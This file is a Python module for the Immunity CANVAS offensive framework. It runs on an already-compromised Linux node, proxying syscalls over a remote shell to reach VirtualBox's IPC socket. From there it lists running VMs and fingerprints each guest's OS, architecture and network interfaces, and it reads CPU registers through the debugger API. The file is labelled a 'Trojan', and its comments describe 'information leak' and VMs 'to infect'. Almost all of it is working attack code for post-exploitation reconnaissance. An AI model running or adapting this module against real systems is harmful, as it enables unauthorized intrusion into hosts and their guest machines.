#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  vbox_list_vms.py
## Description:
##            :
## Created_On :  Mon Mar 25 2019
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import re
import struct
import socket
import time
import gzip
import random
import logging
from timeit import default_timer as timer

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from canvaserror import *
from libs.canvasos import canvasos
import canvasengine
from ExploitTypes.utility import Utility
from tcpexploit import *

# virtualization API
import libs.virtualization.virtualbox.libvboxmanage as vboxmanage

NAME                     = "vbox_list_vms"
DESCRIPTION              = "List of the VirtualBox VMS running on selected nodes."
VERSION                  = "1.0"
GTK2_DIALOG              = "dialog.glade2"

PROPERTY                 = {}
PROPERTY['TYPE']         = "Commands"
PROPERTY['ARCH']         = [ ["Linux"], ["Windows"] ]
PROPERTY['VERSION']      = [ "All" ]
PROPERTY['SITE']         = "Trojans"

DOCUMENTATION            = {}
DOCUMENTATION["Warning"] = "Can only be used from a Linux node for now and currently restricted to VirtualBox 5.2.x and 6.0.x"
DOCUMENTATION["Notes"]   = """

This attack is not exploiting any bug but rather a feature. It is thus unlikely
to be ever patched.
"""

###
# Globals
###

NBR_ATTEMPTS = 5
CANONICAL_ADDR_LOWER_KERNEL = 0xFFFF800000000000L
CANONICAL_ADDR_UPPER_KERNEL = 0xFFFFFFFFFFFFFFFFL
MOSDEF_LINUX_CALLBACK_PATH  = '/tmp/cb'

###
# The main class
###

class theexploit(tcpexploit):

    ###
    # Class's API.
    ###

    def __init__(self):
        tcpexploit.__init__(self)
        self.result            = ""
        self.name              = NAME
        self.local_path        = os.path.dirname(__file__)
        self.clientname        = None
        self.payload_fname     = None
        self.debug             = False
        self.respath           = os.path.abspath(os.path.join(self.local_path, "Resources/"))
        self.node_fd           = None
        self.node_vboxsvc_path = None
        self.with_timer        = True
        self.force_upload      = False
        self.username          = ''
        self.password          = ''
        self.domain            = ''

        if not os.path.exists(self.respath): os.mkdir(self.respath)

    def getargs(self):
        '''
        The arguments handling function
        '''

        self.debug = bool(self.argsDict.get('debug', self.debug))
        if self.debug:
            logger = logging.getLogger()
            logger.setLevel(logging.DEBUG)

    ###
    # VBOX - Common API
    ###


    def vbox_common_getproperty(self, target_iid, property_str):
        '''
        Returns the value associated with a specific property stored within the IMachine class (WRAPPER)
        Note: We mostly use this for information leak and fingerprinting.
        '''

        for i in xrange(NBR_ATTEMPTS):
            status, value = vboxmanage.vboxmanage_guestproperty_get(target_iid, property_str, handlers=self.handlers)
            if not status:
                return 0, value

        return status, None


    def vbox_common_osdetect(self, target_iid):
        '''
        Loads all DBGF plug-in and detects the OS version (WRAPPER)
        Note: We mostly use this for information leak and fingerprinting.
        '''

        for i in xrange(NBR_ATTEMPTS):
            status, value = vboxmanage.vboxmanage_debugvm_osdetect(target_iid, handlers=self.handlers)
            if not status:
                return 0, value

        return status, None


    def vbox_common_getregisters(self, target_iid, registers):
        '''
        Returns the registers values by calling the IMachineDebugger class (WRAPPER)
        Note: We mostly use this for information leak and fingerprinting.
        '''

        for i in xrange(NBR_ATTEMPTS):
            status, reg_values = vboxmanage.vboxmanage_debugvm_getregisters(target_iid, registers=registers, handlers=self.handlers)
            if not status:
                return 0, reg_values

        return status, None


    ###
    # Guessing functions
    ###


    def is_vbox_running(self):
        '''
        Returns True if the LocalNode is a virtualbox host, False otherwise.
        '''

        ipcc = vboxmanage.IPC_class()
        ipcc.set_handlers(self.handlers)
        ret, e = ipcc.start()
        if ret:
            return False
        ipcc.send_clienthello()
        ipcc.define_target()
        ret = ipcc.resolve_clientname()
        if not ret:
            self.clientname = ipcc.client_name
            logging.info('Found VirtualBox %s' % self.clientname)

        ipcc.close_connection()
        return True


    def guess_vm_architecture(self, iid_str):
        '''
        Detects if the VBOX VM is running a 32 or a 64 bits intel VM.
        Note: Unfortunately even with 32 bits VM, extended registers are accepted
        which is why even 32 bits VM will answer positively to RIP, RSP, etc.. while
        it makes little sense architecture wise. For that reason, we use heuristics
        based on the values of the registers always containing pointers.
        Another way, possibly faster would be through segment selectors as they are
        supposed to be stable.
        '''

        score = 0
        reg_names = ['rip','rsp','rbp']

        # This should be well enough to reach kernel land
        for i in xrange(NBR_ATTEMPTS):

            status, reg_values = self.vbox_common_getregisters(iid_str, reg_names)
            if status:
                logging.debug('Dropping sample')
                continue

            for reg_name in reg_names:
                if reg_values.has_key(reg_name):
                    try:
                        current_val = int(reg_values[reg_name], 16)
                    except:
                        continue
                    else:
                        score += int(current_val > CANONICAL_ADDR_LOWER_KERNEL and current_val < CANONICAL_ADDR_UPPER_KERNEL)

            if score > 0:
                return 'x64'

        return 'X86'


    def guess_vm_os(self, iid_str):
        '''
        Detects which OS the guest is running.
        Are we running Linux or Windows?
        We use 2 different fingerprint methods.
        '''

        status, os_version = self.vbox_common_getproperty(iid_str, '/VirtualBox/GuestInfo/OS/Product')
        if not status and os_version:
            return 0, os_version
        else:
            return self.vbox_common_osdetect(iid_str)


    def leak_network_interfaces(self, iid_str):
        '''
        Detects all the network interfaces on the VM.
        '''

        network_interfaces = []

        try:
            status, property_val = self.vbox_common_getproperty(iid_str, '/VirtualBox/GuestInfo/Net/Count')
            if status or not property_val:
                return -2, network_interfaces

            nr_interfaces = int(property_val)

            for i in xrange(nr_interfaces):

                network_interface = {}

                for property_str in [ 'V4/IP', 'MAC', 'V4/Net', 'Status', 'Name', 'V4/Bro' ]:

                    status, property_val = self.vbox_common_getproperty(iid_str, '/VirtualBox/GuestInfo/Net/%d/%s' % (i, property_str))
                    if status or not property_val:
                        continue

                    network_interface[property_str] = property_val

                network_interfaces.append(network_interface)

            return 0, network_interfaces

        except Exception as e:
            return -1, network_interfaces


    def leak_release(self, iid_str):
        '''
        Detects the release version (mostly works for Linux)
        '''

        status, os_release = self.vbox_common_getproperty(iid_str, '/VirtualBox/GuestInfo/OS/Release')
        if not status and os_release:
            return 0, os_release
        else:
            return -1, None


    ###
    # Fingerprinting functions
    ###


    def fingerprint_all_vms(self):
        '''
        Performs the fingerprint process on all the VMs for the current node.
        '''

        self.current_vms = []


        # First of all we need to retrieve the list of VMs (name+IID)
        # This is equivalent to vboxmanage list runningvms
        logging.info("Listing up and running VMs")

        start = timer()
        ret, vms = vboxmanage.vboxmanage_list_vms(handlers=self.handlers)
        if ret:
            logging.error('An error prevented us from retrieving the list of running vms! [err:%x]' % ret)
            return 0

        end = timer()
        logging.debug('Took %ss to complete vboxmanage_list_runningvms()' % (end-start))

        if not len(vms):
            logging.error('No running VMs to infect for now, please retry later.')
            return 1

        logging.info('Found %d VM(s)' % len(vms))

        # Now we need to detect the hostinformation!
        for vm in vms:

            current_vm = {}
            current_vm['name'] = vm['name']
            current_vm['iid'] = vm['iid']
            current_vm['state'] = vm['state']

            logging.info('Fingerprinting \"%s\" - {%s}' % (vm['name'], vm['iid']))

            if vm['state'] != vboxmanage.MACHINE_STATE_RUNNING:
                logging.info('This VM is not currently running, skipping fingerprinting!')
                self.current_vms.append(current_vm)
                continue

            # 1. Fingerprinting the OS
            logging.info('Attempting to discover the OS')
            ret, vm_guest_os = self.guess_vm_os(vm['iid'])
            if ret or not vm_guest_os:
                logging.warn('Could not fingerprint correctly the VM, the API is mostly broken, skipping VM.')
                continue

            is_windows = 'windows' in vm_guest_os.lower() or 'winnt' in vm_guest_os.lower()
            is_linux = 'linux' in vm_guest_os.lower()

            if not is_windows and not is_linux:
                logging.debug('Unhandled type of VM, skipping [ver:\"%s\"]' % vm_guest_os)
                continue

            if is_windows:
                os_version="WINDOWS"
            elif is_linux:
                os_version="Linux"
            else:
                os_version='Unknown'

            current_vm['os'] = os_version

            ret, os_release = self.leak_release(vm['iid'])
            if ret or not os_release:
                logging.warn('Skipping release detection')
            else:
                current_vm['release'] = os_release

            # 2. Fingerprinting the architecture
            logging.info('Attempting to fingerprint the architecture')
            os_arch = self.guess_vm_architecture(vm['iid'])
            logging.debug('A %s (%s) VM was detected [ver:\"%s\"]' % (os_version, os_arch, vm_guest_os))

            current_vm['arch'] = os_arch

            # 3. Network interfaces
            logging.info('Retrieving network information')
            ret, network_interfaces = self.leak_network_interfaces(vm['iid'])
            if not ret:
                current_vm['network'] = network_interfaces

            self.current_vms.append(current_vm)

        return 1


    def display_vms(self, node_name, node_type):

        def convert_state_into_string(state):
            if state == vboxmanage.MACHINE_STATE_NULL:
                return 'NULL'
            elif state == vboxmanage.MACHINE_STATE_POWEREDOFF:
                return 'POWEREDOFF'
            elif state == vboxmanage.MACHINE_STATE_SAVED:
                return 'SAVED'
            elif state == vboxmanage.MACHINE_STATE_TELEPORTED:
                return 'TELEPORTED'
            elif state == vboxmanage.MACHINE_STATE_ABORTED:
                return 'ABORTED'
            elif state == vboxmanage.MACHINE_STATE_RUNNING:
                return 'RUNNING'
            else:
                return '???'

        logging.info('Node %s [type: %s] has %s VM(s)' % (node_name, node_type, len(self.current_vms)))
        for i in xrange(len(self.current_vms)):
            vm = self.current_vms[i]
            logging.info('VM_%d:' % i)
            logging.info('    Name: \"%s\"', vm['name'])
            logging.info('    IID: \"%s\"', vm['iid'])
            logging.info('    State: \"%s\"', convert_state_into_string(vm['state']))
            if vm.has_key('os'):
                logging.info('    OS: \"%s\" (guessed)', vm['os'])
                if vm['os'].lower() == 'linux' and vm.has_key('release'):
                    logging.info('        -> Release: \"%s\"', vm['release'])
            if vm.has_key('arch'):
                logging.info('    Architecture: \"%s\" (guessed)', vm['arch'])
            if vm.has_key('network'):
                logging.info('    Network:')
                for j in xrange(len(vm['network'])):
                    network = vm['network'][j]
                    if network.has_key('Name'):
                        iface_name = network['Name']
                    else:
                        iface_name = '???'
                    logging.info('        iface: %s (%s)' % (iface_name, network['Status']))
                    logging.info('        ip: %s' % (network['V4/IP']))
                    if network.has_key('V4/Net'):
                        logging.info('        netmask: %s' % (network['V4/Net']))
                    if network.has_key('V4/Bro'):
                        logging.info('        broadcast: %s' % (network['V4/Bro']))


    ###
    # Syscall proxying
    ###


    def node_create_connection(self, server_address):
        '''
        Creates a socket and connects to the unix path.
        '''

        code = """
        #import "string", "srv_sockname" as "srv_sockname"
        #import "local", "socket" as "socket"
        #import "local", "connect" as "connect"
        #import "local", "memset" as "memset"
        #import "local", "sendint" as "sendint"
        #import "local", "strcpy" as "strcpy"
        #import "local", "setsockopt" as "setsockopt"

        struct sockaddr_un {
            unsigned short sun_family;
            char        sun_path[108];
        };

        struct timeval {
            long tv_sec;
            long tv_usec;
        };

        void main()
        {
            struct sockaddr_un srv_addr;
            int res;
            int sock;
            struct timeval tv;

            memset(srv_addr.sun_path, 0, 108);
            srv_addr.sun_family = 1; // AF_UNIX
            strcpy(srv_addr.sun_path, srv_sockname);
            sock = socket(1, 1, 0); // socket(AF_UNIX, SOCK_STREAM, 0);
            sendint(sock);
            if(sock < 0)
            {
                return;
            }
            res = connect(sock, &srv_addr, 110);
            sendint(res);

            tv.tv_sec = 2;
            tv.tv_usec = 0;

            res = setsockopt(sock, 1, 20, &tv, 16); // SOL_SOCKET=1, SO_RCVTIMEO=20
            sendint(res);

            return;
        }
        """

        logging.debug('SP: create_connection')
        self.node.shell.clearfunctioncache()
        req = self.node.shell.compile(code, { 'srv_sockname' : server_address })
        self.node.shell.sendrequest(req)

        # socket()
        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            self.node.shell.leave()
            return -1, "Failed to create Unix Domain Socket [err:%d]" % ret

        self.node_fd = ret
        logging.debug("Unix Domain socket created: %d" % self.node_fd)

        # connect()
        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            self.node.shell.leave()
            self.node_close_connection()
            return -2, "Failed connect to %s" % server_address

        logging.debug("Connected to Unix Domain socket (%s) [err:%d]" % (server_address,ret))

        # setsockopt()
        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            logging.warn("setsockopt failed [err:%d]" % ret)
        else:
            logging.debug('Successfully set socket timer to 2s!')

        self.node.shell.leave()
        return 0, None


    def node_close_connection(self):
        '''
        Closes the unix socket
        '''

        if self.node_fd:
            self.node.shell.close(self.node_fd)


    def node_find_socket(self):
        '''
        Search remotely for a specific unix socket.
        Returns the fullpath if successfull.
        '''

        # Singleton design pattern to boost performance
        if self.node_ipcd_path:
            return self.node_ipcd_path

        dir_list = self.node.shell.dodir('/tmp')
        if not dir_list:
            return None

        re_exp = re.compile(vboxmanage.UNIX_SOCKET_NAME_TEMPLATE)
        for x in dir_list:
            candidate, _ = x
            if re_exp.search(candidate):
                try:
                    candidate_fullpath = '/tmp/%s/ipcd' % candidate
                    ret, _ = self.node.shell.stat(candidate_fullpath)
                    if ret == 0:
                        self.node_ipcd_path = candidate_fullpath
                        return candidate_fullpath
                except Exception as e:
                    continue
        return None


    def _write(self, fd, data):
        '''
        Writes all the data in data to fd
        '''

        code="""
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "string", "buffer" as "buffer"
        #import "local", "write" as "write"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int ret;
            ret = write(fd, buffer, length);
            sendint(ret);
        }
        """

        vars = {}
        vars["fd"] = fd
        vars["length"] = len(data)
        vars["buffer"] = data

        #self.node.shell.clearfunctioncache()
        message = self.node.shell.compile(code,vars)
        self.node.shell.sendrequest(message)
        ret = self.node.shell.readint(signed=True)
        self.node.shell.leave()
        if ret < 0:
            return -1
        return 0


    def _read(self, fd):
        '''
        Reads a length sent on the socket then read the whole payload
        '''

        code="""
        #import "int", "fd" as "fd"
        #import "local", "read" as "read"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int ret;
            char *p;
            char buffer[2048];
            int data_length;

            data_length = 0;
            p = &data_length;
            ret = read(fd, p, 4);
            sendint(ret);
            if(ret > 0)
            {
                sendint(data_length);
                p = buffer;
                data_length = data_length - 4;
                ret = read(fd, p, data_length);
                sendint(ret);
                if (ret > 0)
                {
                    sendblock2self(buffer, ret);
                }
            }
        }
        """

        #self.node.shell.clearfunctioncache()
        message = self.node.shell.compile(code, { "fd": fd })
        self.node.shell.sendrequest(message)

        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            self.node.shell.leave()
            return -1, None

        data_length = self.node.shell.readint(signed=True)

        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            self.node.shell.leave()
            return -2, None

        if ret == 0:
            self.node.shell.leave()
            return -3, None

        data = self.node.shell.readblock()
        self.node.shell.leave()
        return 0, struct.pack('<L', data_length) + data

    def node_send_receive(self, payload):
        '''
        Remote write & read of data on the socket, returns what is read.
        '''

        logging.debug('SP: send_receive')
        try:
            ret = self._write(self.node_fd, payload)
            if ret:
                logging.info('node_send_receive() failed to write payload!')
                return None

            time.sleep(0.01)
            ret, data = self._read(self.node_fd)
            if ret:
                logging.info('node_send_receive() failed to recv payload! [err=%x]' % ret)
                return None
            else:
                return data
        except Exception as e:
            logging.info('Error detected in node_send_receive(): %s' % str(e))
            return None


    def node_receive(self):
        '''
        Remote read of data on the socket, returns what is read.
        '''

        logging.debug('SP: receive')
        try:
            time.sleep(0.01)
            ret, data = self._read(self.node_fd)
            if ret:
                logging.info('node_receive() failed to recv payload!')
                return None
            return data
        except Exception as e:
            logging.info('Error detected in node_receive(): %s' % str(e))
            return None


    def get_vbox_version(self):
        '''
        Retrieves the VirtualBox version using a grep like search.
        '''

        # Singleton design pattern to boost performance
        if self.node_vboxsvc_path:
            return self.node_vboxsvc_path

        candidates_files = [ "/usr/lib/virtualbox/components/VBoxSVCM.so" ]

        for candidate in candidates_files:

            O_RDONLY = self.node.shell.libc.getdefine('O_RDONLY')
            fd = self.node.shell.open(candidate, O_RDONLY)
            if fd < 0:
                logging.error('Reading of %s failed' % candidate)
                return 0

            data = self.node.shell.readall(fd)
            self.node.shell.close(fd)

            re_exp = re.compile('VBoxSVC-[0-9]+.[0-9]+.[0-9]+[_a-zA-Z]*\0')
            ret = re_exp.search(data)
            if ret:
                res = ret.group(0)
                self.node_vboxsvc_path = res
                return res


    ###
    # Entry point - testing/debugging only
    ###


    def run(self):
        self.setInfo("%s (in progress)"%(NAME))

        # Fetching the arguments
        self.getargs()

        # Patching the callback. By default CANVAS may use a localhost/localport
        # callback if no 'target' is specified even if the callback interface is
        # correctly set.

        self.callback = self.engine.autoListener(self,
                                                 canvasengine.UNIVERSAL_MOSDEF,
                                                 host=self.engine.callback_interface,
                                                 autoFind=False)

        for node in self.argsDict["passednodes"]:

            self.node = node
            node_type = node.nodetype
            node_name = node.getname()

            # Initialization of the two remote paths.
            self.node_vboxsvc_path = None
            self.node_ipcd_path = None

            # We can only infect Linux hosts for now
            if not "Unix Shell" in node.capabilities:
                logging.info("Node %s is not a Linux host, skipping" % node_name)
                continue

            # If the host is local then we must use the default handlers from the library
            if node_type == "LocalNode":
                logging.info('Using local handlers')
                self.handlers = None
                self.with_timer = True

            # If the host is a remote Linux node AND if it has a shell (which should
            # always be the case practically speaking, then we may define new handlers
            # for syscall proxying.
            elif node_type == 'linuxNode':

                if hasattr(node, 'shell') and node.shell:
                    logging.info('Using syscall proxying handlers')
                    self.with_timer = False
                    self.handlers = { 'find_socket':       self.node_find_socket,
                                      'create_connection': self.node_create_connection,
                                      'close_connection':  self.node_close_connection,
                                      'send_receive':      self.node_send_receive,
                                      'receive':           self.node_receive,
                                      'get_vbox_version':  self.get_vbox_version,
                                    }
                else:
                    logging.warn('Skipping broken Linuxnode %s' % (node_name))
                    continue
            else:
                logging.warn('Skipping unhandled Unix shell %s' % (node_name))
                continue

            # Is vbox running?
            logging.info('Attempting to see if VirtualBox runs on node %s' % node_name)
            ret = self.is_vbox_running()
            if not ret:
                logging.info('Node %s is not a host running VirtualBox' % node_name)
                continue

            logging.info('Node %s is a Virtualbox Host!' % node_name)
            self.current_vms = []
            logging.info('Starting to fingerprint all its VMs')
            self.fingerprint_all_vms()
            self.display_vms(node_name, node_type)

        self.setInfo("%s - done (success)"%(NAME))
        return 1


if __name__== "__main__":
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
